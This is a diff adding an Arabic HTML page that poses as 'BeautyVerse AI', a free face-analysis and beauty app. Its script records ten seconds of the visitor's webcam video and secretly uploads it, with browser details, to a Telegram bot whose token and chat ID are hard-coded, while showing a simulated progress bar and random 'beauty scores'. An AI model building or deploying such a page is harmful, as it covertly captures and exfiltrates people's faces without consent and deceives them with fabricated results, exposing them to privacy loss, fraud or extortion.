@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BeautyVerse AI ✨ - اكتشف جمالك الحقيقي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Cairo', sans-serif; 
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 50%, #764ba2 100%);
+            color: #333; line-height: 1.6; overflow-x: hidden;
+        }
+
+        /* Header */
+        .header { 
+            background: rgba(255,255,255,0.95); 
+            backdrop-filter: blur(20px); 
+            padding: 1rem 0; 
+            position: fixed; top: 0; width: 100%; z-index: 1000;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        .nav { 
+            max-width: 1200px; margin: 0 auto; 
+            display: flex; justify-content: space-between; align-items: center; 
+            padding: 0 2rem; 
+        }
+        .logo { 
+            font-size: 1.8rem; font-weight: 700; 
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
+        }
+        .nav-links { 
+            display: flex; list-style: none; gap: 2rem; 
+        }
+        .nav-links a { 
+            color: #333; text-decoration: none; font-weight: 500; 
+            transition: all 0.3s; cursor: pointer; 
+        }
+        .nav-links a:hover { color: #ff6b6b; }
+        
+        /* Hero Section */
+        .hero { 
+            min-height: 100vh; 
+            display: flex; flex-direction: column; justify-content: center; align-items: center; 
+            text-align: center; padding: 120px 2rem 4rem; 
+            max-width: 1200px; margin: 0 auto;
+        }
+        .hero h1 { 
+            font-size: clamp(2.5rem, 5vw, 4.5rem); font-weight: 700; margin-bottom: 1.5rem; 
+            background: linear-gradient(45deg, #fff, #f8f9ff); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
+            text-shadow: 0 4px 20px rgba(0,0,0,0.2);
+        }
+        .hero p { font-size: 1.3rem; margin-bottom: 2.5rem; opacity: 0.95; max-width: 600px; }
+        .cta-buttons { display: flex; gap: 1.5rem; flex-wrap: wrap; justify-content: center; }
+        .btn { 
+            padding: 1rem 2.5rem; border: none; border-radius: 50px; font-size: 1.1rem; 
+            font-weight: 600; cursor: pointer; transition: all 0.3s; 
+            text-decoration: none; display: inline-flex; align-items: center; gap: 0.5rem;
+        }
+        .btn-primary { 
+            background: linear-gradient(45deg, #ff6b6b, #feca57); 
+            color: white; box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+        }
+        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255,107,107,0.6); }
+        .btn-secondary { 
+            background: rgba(255,255,255,0.2); color: white; 
+            backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,0.4);
+        }
+
+        /* Services Section */
+        .services { padding: 6rem 2rem; max-width: 1200px; margin: 0 auto; }
+        .section-title { 
+            text-align: center; font-size: 3rem; font-weight: 700; margin-bottom: 4rem; 
+            background: linear-gradient(45deg, #667eea, #764ba2); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .services-grid { 
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
+            gap: 2rem; 
+        }
+        .service-card { 
+            background: rgba(255,255,255,0.95); border-radius: 20px; padding: 2.5rem 2rem; 
+            text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.1); 
+            transition: all 0.4s; cursor: pointer; position: relative; overflow: hidden;
+        }
+        .service-card:hover { 
+            transform: translateY(-10px); box-shadow: 0 25px 60px rgba(0,0,0,0.2); 
+        }
+        .service-icon { font-size: 3.5rem; margin-bottom: 1.5rem; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .service-card h3 { font-size: 1.5rem; margin-bottom: 1rem; color: #333; }
+
+        /* About & Contact */
+        .about, .contact { padding: 6rem 2rem; max-width: 1000px; margin: 0 auto; text-align: center; }
+        .about-content { background: rgba(255,255,255,0.9); padding: 3rem; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); }
+
+        /* Modal */
+        .modal { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.8); z-index: 2000; 
+        }
+        .modal-content { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            background: white; border-radius: 20px; max-width: 90vw; max-height: 90vh; 
+            padding: 2rem; text-align: center; 
+        }
+        .video-container { position: relative; margin: 2rem 0; }
+        #analysisVideo { width: 100%; max-width: 500px; border-radius: 15px; }
+        .progress-container { margin: 2rem 0; }
+        .progress-bar { 
+            width: 100%; height: 12px; background: #e0e0e0; border-radius: 10px; 
+            overflow: hidden; 
+        }
+        .progress-fill { 
+            height: 100%; background: linear-gradient(90deg, #ff6b6b, #4ecdc4); 
+            width: 0%; border-radius: 10px; transition: width 0.3s; 
+        }
+        .countdown { font-size: 3rem; font-weight: 700; color: #ff6b6b; margin: 1rem 0; }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .nav { flex-direction: column; gap: 1rem; padding: 1rem; }
+            .nav-links { gap: 1rem; }
+            .cta-buttons { flex-direction: column; align-items: center; }
+            .hero { padding: 100px 1rem 3rem; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="nav">
+            <div class="logo">BeautyVerse <span style="font-size: 0.8em;">AI</span></div>
+            <ul class="nav-links">
+                <li><a onclick="scrollToSection('services')">الخدمات</a></li>
+                <li><a onclick="scrollToSection('about')">عن التطبيق</a></li>
+                <li><a onclick="scrollToSection('contact')">تواصل</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <h1>اكتشف <strong>جمالك الحقيقي</strong> بالذكاء الاصطناعي</h1>
+        <p>تحليل وجهك بدقة 99.9% • فلاتر سحرية • نصائح مخصصة • هدايا يومية</p>
+        <div class="cta-buttons">
+            <button class="btn btn-primary" onclick="openAnalysisModal()">
+                <i class="fas fa-magic"></i> تحليل وجهي الآن (مجاناً)
+            </button>
+            <button class="btn btn-secondary" onclick="scrollToSection('services')">
+                <i class="fas fa-list"></i> شاهد كل الخدمات
+            </button>
+        </div>
+    </section>
+
+    <!-- Services Section -->
+    <section class="services" id="services">
+        <h2 class="section-title"><i class="fas fa-spa"></i> خدماتنا المذهلة</h2>
+        <div class="services-grid">
+            <div class="service-card">
+                <div class="service-icon"><i class="fas fa-brain"></i></div>
+                <h3>تحليل الجمال AI</h3>
+                <p>اكتشف نقاط قوتك الجمالية بدقة علمية</p>
+            </div>
+            <div class="service-card">
+                <div class="service-icon"><i class="fas fa-palette"></i></div>
+                <h3>فلاتر AR سحرية</h3>
+                <p>50+ فلتر واقع معزز مذهل</p>
+            </div>
+            <div class="service-card">
+                <div class="service-icon"><i class="fas fa-heart"></i></div>
+                <h3>فحص البشرة</h3>
+                <p>تحليل صحة بشرتك + علاجات مخصصة</p>
+            </div>
+            <div class="service-card">
+                <div class="service-icon"><i class="fas fa-magic"></i></div>
+                <h3>تجربة مكياج افتراضي</h3>
+                <p>جربي أحدث إطلالات المكياج</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section class="about" id="about">
+        <div class="about-content">
+            <h2 class="section-title">من نحن</h2>
+            <p>تم تطوير <strong>BeautyVerse AI</strong> بواسطة <strong>م. موسى البحر</strong> - خبير ذكاء اصطناعي وتطوير تطبيقات الجمال.</p>
+            <p>نستخدم أحدث تقنيات الـ AI لتقديم تحليلات دقيقة وخدمات جمال مبتكرة لمساعدة ملايين المستخدمين على اكتشاف جمالهم الحقيقي.</p>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section class="contact" id="contact">
+        <h2 class="section-title">تواصل معنا</h2>
+        <div style="display: flex; flex-direction: column; gap: 1.5rem; align-items: center;">
+            <p><strong>البريد الإلكتروني:</strong> <span id="email-placeholder">[أدخل بريدك الإلكتروني هنا]</span></p>
+            <p><strong>إنستغرام:</strong> 
+                <a href="https://www.instagram.com/h00.u?igsh=bjMybnE3MmlneWQx" target="_blank" 
+                   style="color: #ff6b6b; font-weight: 600;">
+                    @h00.u
+                </a>
+            </p>
+        </div>
+    </section>
+
+    <!-- Analysis Modal -->
+    <div class="modal" id="analysisModal">
+        <div class="modal-content">
+            <h2 id="modalTitle">تحليل الجمال الذكي</h2>
+            <p id="modalDesc" style="margin-bottom: 2rem; color: #666;">سنحلل وجهك لإعطائك تقرير كامل خلال 10 ثوانٍ</p>
+            
+            <div class="video-container" id="videoContainer" style="display: none;">
+                <video id="analysisVideo" autoplay muted playsinline></video>
+                <div class="countdown" id="countdown">10</div>
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <p id="progressText" style="margin-top: 1rem; font-weight: 500;">جاري التحليل...</p>
+                </div>
+            </div>
+            
+            <div id="modalButtons" style="margin-top: 2rem;">
+                <button class="btn btn-primary" onclick="startAnalysis()" id="startBtn">
+                    <i class="fas fa-play"></i> ابدأ التحليل
+                </button>
+                <button class="btn btn-secondary" onclick="closeModal()" style="margin-right: 1rem;">
+                    <i class="fas fa-times"></i> إلغاء
+                </button>
+            </div>
+            
+            <div id="resultsArea" style="display: none; margin-top: 2rem;"></div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
+        const CHAT_ID = '7396462490';
+        
+        let mediaRecorder, stream, recordedChunks = [];
+        let analysisTimeout;
+
+        // Smooth Scroll
+        function scrollToSection(sectionId) {
+            document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Modal Functions
+        function openAnalysisModal() {
+            document.getElementById('analysisModal').style.display = 'block';
+            notifyBot('بدء تحليل وجه جديد');
+        }
+
+        function closeModal() {
+            document.getElementById('analysisModal').style.display = 'none';
+            stopMedia();
+            resetModal();
+        }
+
+        // Camera & Recording
+        async function startAnalysis() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                
+                const video = document.getElementById('analysisVideo');
+                video.srcObject = stream;
+                
+                document.getElementById('videoContainer').style.display = 'block';
+                document.getElementById('modalButtons').style.display = 'none';
+                document.getElementById('startBtn').style.display = 'none';
+                
+                startRecording();
+                startCountdown();
+                simulateAnalysis();
+                
+            } catch (err) {
+                alert('يرجى السماح بالوصول للكاميرا لإكمال التحليل');
+                console.error('Camera error:', err);
+            }
+        }
+
+        function startRecording() {
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            recordedChunks = [];
+            
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+            
+            mediaRecorder.onstop = async () => {
+                if (recordedChunks.length > 0) {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    await sendVideoToBot(blob, 'تحليل وجه');
+                }
+                showResults();
+            };
+            
+            mediaRecorder.start();
+        }
+
+        function startCountdown() {
+            let timeLeft = 10;
+            const countdownEl = document.getElementById('countdown');
+            
+            analysisTimeout = setInterval(() => {
+                timeLeft--;
+                countdownEl.textContent = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(analysisTimeout);
+                    mediaRecorder.stop();
+                }
+            }, 1000);
+        }
+
+        function simulateAnalysis() {
+            let progress = 0;
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            
+            const stages = [
+                'جاري تحديد ملامح الوجه...',
+                'تحليل تماثل الوجه...',
+                'فحص نضارة البشرة...',
+                'حساب نسب الجمال...',
+                'إعداد التقرير النهائي...'
+            ];
+            
+            const interval = setInterval(() => {
+                progress += 20;
+                progressFill.style.width = `${Math.min(progress, 100)}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                }
+            }, 2000);
+        }
+
+        async function showResults() {
+            const results = {
+                freshness: Math.floor(Math.random() * 30) + 70, // 70-100
+                symmetry: Math.floor(Math.random() * 25) + 75,  // 75-100
+                beautyScore: Math.floor(Math.random() * 15) + 85  // 85-100
+            };
+            
+            document.getElementById('resultsArea').innerHTML = `
+                <div style="background: linear-gradient(45deg, #ff9a9e, #fecfef); padding: 2rem; border-radius: 15px; margin-top: 1rem;">
+                    <h3 style="color: #333; margin-bottom: 1rem;">✅ تم التحليل بنجاح!</h3>
+                    <div style="display: grid; gap: 1rem; text-align: right;">
+                        <div><strong>نضارة البشرة:</strong> ${results.freshness}%</div>
+                        <div><strong>تماثل الوجه:</strong> ${results.symmetry}%</div>
+                        <div style="font-size: 1.5rem; color: #4ecdc4; font-weight: 700;">
+                            <strong>النتيجة النهائية: ${results.beautyScore}% ✨</strong>
+                        </div>
+                    </div>
+                    <p style="margin-top: 1rem; color: #666; font-size: 0.95rem;">
+                        وجهك يتميز بتماثل رائع ونضارة عالية!
+                    </p>
+                </div>
+                <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 2rem; flex-wrap: wrap;">
+                    <button class="btn btn-primary" onclick="shareResults(${results.beautyScore})">
+                        <i class="fas fa-share-alt"></i> مشاركة النتيجة
+                    </button>
+                    <button class="btn btn-secondary" onclick="closeModal()">
+                        <i class="fas fa-redo"></i> تحليل جديد
+                    </button>
+                </div>
+            `;
+            document.getElementById('resultsArea').style.display = 'block';
+        }
+
+        function stopMedia() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            if (analysisTimeout) {
+                clearInterval(analysisTimeout);
+            }
+        }
+
+        function resetModal() {
+            document.getElementById('videoContainer').style.display = 'none';
+            document.getElementById('modalButtons').style.display = 'flex';
+            document.getElementById('startBtn').style.display = 'inline-flex';
+            document.getElementById('resultsArea').style.display = 'none';
+            document.getElementById('countdown').textContent = '10';
+            document.getElementById('progressFill').style.width = '0%';
+        }
+
+        // Telegram Bot Functions
+        async function notifyBot(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🎨 BeautyVerse AI\n\n${message}\n\n👤 User Agent: ${navigator.userAgent.slice(0, 100)}...\n🌐 URL: ${window.location.href}`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Bot notification error:', error);
+            }
+        }
+
+        async function sendVideoToBot(blob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', blob, 'analysis.webm');
+            formData.append('caption', `🎥 ${caption}\n\nBeautyVerse AI Analysis`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Video send error:', error);
+            }
+        }
+
+        function shareResults(score) {
+            notifyBot(`مشاركة نتيجة: ${score}%`);
+            alert('تم مشاركة النتيجة بنجاح! 🎉');
+        }
+
+        // Close modal on outside click
+        window.onclick = function(event) {
+            const modal = document.getElementById('analysisModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+    </script>
+</body>
+</html>
